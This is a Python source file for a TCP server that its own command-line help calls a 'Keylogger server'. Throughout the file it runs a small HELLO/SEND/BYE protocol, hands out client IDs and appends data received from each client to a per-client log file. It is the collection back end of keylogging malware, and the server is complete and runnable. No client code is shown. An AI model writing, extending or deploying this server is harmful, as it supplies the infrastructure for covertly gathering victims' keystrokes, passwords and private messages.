#!/usr/bin/env python
import logging
import argparse
import socketserver
import struct
import configparser
import threading

import protocol


class UnknownMessageType(Exception):
    pass


class TCPHandler(socketserver.BaseRequestHandler):
    """
    The RequestHandler class for server.

    It is instantiated once per connection to the server,
    implements communication with the client.
    """
    def __init__(self, *args):
        super().__init__(*args)
        self.client_id = -1
        self.new_client = False

    def handle(self):
        try:
            self.server.logger.info('Serving request from  ' + self._client_address_str())

            msg_type = self._recv_msg_type()
            if msg_type is not protocol.ClientMsgTypes.HELLO:
                self.server.logger.warning(
                    'Received ' + msg_type.name + ' while expecting ' + protocol.ClientMsgTypes.HELLO.name + ' from ' + self._client_address_str())
                self.request.sendall(struct.pack('>B', protocol.Error.ILLEGAL_MSG_TYPE))
                self.server.logger.warning('Connection with ' + self._client_address_str() + ' terminated')
                return

            self.server.logger.info('Received message with type ' + msg_type.name + ' from ' + self._client_address_str())

            while not self._set_up_connection():
                msg_type = self._recv_msg_type()
                if msg_type is protocol.ClientMsgTypes.HELLO:
                    self.server.logger.info('Received message with type ' + msg_type.name + ' from ' + self._client_address_str())
                    continue
                elif msg_type is protocol.ClientMsgTypes.BYE:
                    self.server.logger.info('Received message with type ' + msg_type.name + ' from ' + self._client_address_str())
                    self.server.logger.info('End connection with ' + self._client_address_str())
                    return
                else:
                    self.server.logger.warning(
                        'Received ' + msg_type.name + ' while expecting ' + protocol.ClientMsgTypes.HELLO.name + ' or ' +
                        protocol.ClientMsgTypes.BYE.name + ' from ' + self._client_address_str())
                    self.request.sendall(struct.pack('>B', protocol.Error.ILLEGAL_MSG_TYPE))
                    self.server.logger.warning('Connection with ' + self._client_address_str() + ' terminated')
                    return

            if self.new_client:
                self.request.sendall(struct.pack('>B', protocol.ServerMsgTypes.OK_NEW_ID) + struct.pack('>I', self.client_id) + struct.pack('>I', 0))
            else:
                self.request.sendall(struct.pack('>B', protocol.ServerMsgTypes.OK))

            while True:
                msg_type = self._recv_msg_type()
                if msg_type is protocol.ClientMsgTypes.BYE:
                    self.server.logger.info('Received message with type ' + msg_type.name + ' from ' + self._client_address_str())
                    self.server.logger.info('End connection with ' + self._client_address_str())
                    break
                elif msg_type is protocol.ClientMsgTypes.SEND:
                    self.server.logger.info('Received message with type ' + msg_type.name + ' from ' + self._client_address_str())
                    data = self._recv_all(4)
                    length = struct.unpack('>I ', data)[0]
                    data = self._recv_all(length)
                    with open(str(self.client_id) + '.log', 'a+') as client_log_file:
                        # TODO parse data to readable format
                        # TODO optionally add data encryption/decryption
                        client_log_file.write(str(data))
                    self.request.sendall(struct.pack('>B', protocol.ServerMsgTypes.OK))
                else:
                    self.server.logger.warning(
                        'Received ' + msg_type.name + ' while expecting ' + protocol.ClientMsgTypes.SEND.name + ' or ' +
                        protocol.ClientMsgTypes.BYE.name + ' from ' + self._client_address_str())
                    self.request.sendall(struct.pack('>B', protocol.Error.ILLEGAL_MSG_TYPE))
                    self.server.logger.warning('Connection with ' + self._client_address_str() + ' terminated')
                    return
        except ConnectionError:
            self.server.logger.warning('Connection error from ' + self._client_address_str())
            self.server.logger.warning('Connection with ' + self._client_address_str() + ' terminated')
        except UnknownMessageType:
            self.server.logger.warning('Received wrong message type from ' + self._client_address_str())
            self.request.sendall(struct.pack('>B', protocol.Error.UNKNOWN_MSG_TYPE))
            self.server.logger.warning('Connection with ' + self._client_address_str() + ' terminated')
        finally:
            if self.client_id != -1:
                self.server.unregister_id(self.client_id)

    def _recv_msg_type(self):
        data = self._recv_all(1)
        msg_type = struct.unpack('>B', data)[0]
        if msg_type not in map(int, protocol.ClientMsgTypes):
            raise UnknownMessageType()
        return protocol.ClientMsgTypes(msg_type)

    def _set_up_connection(self):
        if not self._check_protocol_version():
            self.server.logger.info(self._client_address_str() + ' wants to communicate via unsupported protocol')
            self.request.sendall(struct.pack('>B', protocol.Error.UNSUPPORTED_PROTOCOL))
            return False

        if not self._check_client_id():
            self.server.logger.info(self._client_address_str() + ' has invalid ID')
            self.request.sendall(struct.pack('>B', protocol.Error.INVALID_ID))
            return False
        return True

    def _check_protocol_version(self):
        data = self._recv_all(4)
        protocol_version = struct.unpack('>I', data)[0]
        if protocol_version != protocol.VERSION:
            return False
        return True

    def _check_client_id(self):
        data = self._recv_all(4)
        id = struct.unpack('>I', data)[0]
        if id == 0xFFFFFFFF:
            id = self.server.get_new_id()
            self.new_client = True
        elif not self.server.is_id_valid(id):
            return False
        self.client_id = id
        return True

    def _recv_all(self, length):
        data = b''
        while len(data) < length:
            more = self.request.recv(length - len(data))
            if not more:
                raise ConnectionError
            data += more
        return data

    def _client_address_str(self):
        return self.client_address[0] + ':' + str(self.client_address[1])


class Server(socketserver.TCPServer):
    def __init__(self, host, port, TCPHandler, log_file, config_file, logger_name='logger'):
        super().__init__((host, port), TCPHandler)
        self.logger = logging.getLogger(logger_name)
        self._format_logger(log_file)
        self.config = configparser.RawConfigParser()
        self.config_file = config_file
        self.mutex = threading.Lock()
        self.connected_clients_id = []

    def serve_forever(self, poll_interval=0.5):
        self.logger.info('Starting server...')
        super().serve_forever()

    def get_new_id(self):
        with self.mutex:
            self.config.read(self.config_file)
            id = self.config.getint('Client ID', 'id')
            self.config.set('Client ID', 'id', str(id + 1))
            with open(self.config_file, 'w') as config_file:
                self.config.write(config_file)
            self.connected_clients_id.append(id)
            return id

    def is_id_valid(self, id):
        with self.mutex:
            self.config.read(self.config_file)
            max_id = self.config.getint('Client ID', 'id')
            if not 0 <= id < max_id or id in self.connected_clients_id:
                return False
            self.connected_clients_id.append(id)
            return True

    def unregister_id(self, id):
        with self.mutex:
            self.connected_clients_id.remove(id)

    def _format_logger(self, log_file):
        self.logger.setLevel(logging.INFO)
        file_handler = logging.FileHandler(log_file, mode='w')
        console_handler = logging.StreamHandler()
        formatter = logging.Formatter('%(levelname)-8s [%(asctime)s] %(message)s', '%H:%M:%S %m-%d-%Y')
        file_handler.setFormatter(formatter)
        console_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)


def parse_arguments():
    parser = argparse.ArgumentParser(description='Keylogger server')
    parser.add_argument('-H', '--host', dest='host', type=str, default='localhost',
                        help='Address on which server will be running (default localhost)')
    parser.add_argument('-p', '--port', dest='port', type=int, default=4000, help='Port on which server will be running (default 4000)')
    parser.add_argument('-c', '--config', dest='config_file', type=str, default='config.ini',
                        help='Path to file which contains proxy server configuration (default config.ini)')
    parser.add_argument('-l', '--log', dest='log_file', type=str, default='server.log',
                        help='Server log file path (default server.log)')
    args = parser.parse_args()
    return args


def main():
    args = parse_arguments()
    server = Server(args.host, args.port, TCPHandler, args.log_file, args.config_file)
    server.serve_forever()


if __name__ == '__main__':
    main()